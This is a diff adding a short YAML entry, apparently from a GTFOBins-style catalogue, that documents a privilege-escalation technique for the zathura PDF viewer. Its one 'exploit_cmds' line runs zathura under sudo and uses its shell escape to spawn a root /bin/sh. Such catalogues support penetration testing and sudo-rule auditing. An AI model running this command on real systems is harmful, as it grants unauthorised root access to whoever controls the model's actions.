@@ -1,0 +1,4 @@
+name: zathura
+binary_path: /usr/bin/zathura
+exploit_cmds:
+- sudo /usr/bin/zathura && :! /bin/sh -c 'exec /bin/sh 0<&1'
